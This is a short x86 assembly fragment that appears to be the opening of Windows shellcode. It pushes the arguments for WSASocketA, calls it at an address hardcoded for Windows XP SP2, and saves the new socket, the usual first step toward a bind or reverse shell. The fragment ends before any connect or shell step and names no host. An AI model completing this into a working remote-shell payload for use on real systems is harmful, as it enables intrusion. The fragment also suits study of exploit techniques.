[BITS 32]

global _start
_start:

xor eax, eax            ; clear EAX
push eax		            ; dwFlags - 0
push eax		            ; Group - 0
push eax		            ; ProtocolInfo - NULL
xor ebx, ebx	          ; clear EBX
mov bl, 6		            ; EBX = 6
push ebx		            ; Protocol - IPPROTO_TCP = 6
inc eax		              ; EAX = 1
push eax		            ; Type - SOCK_STREAM = 1
inc eax                 ; EAX = 2
push eax		            ; Family - AF_INET = 2
mov ebx, 0x71a38769	    ; WSASocketA - WinXP PRO SP2
xor eax, eax            ; clear EAX
call ebx                ; Call WSASocketA
xchg eax, esi		        ; save socket (returned to EAX) into ESI
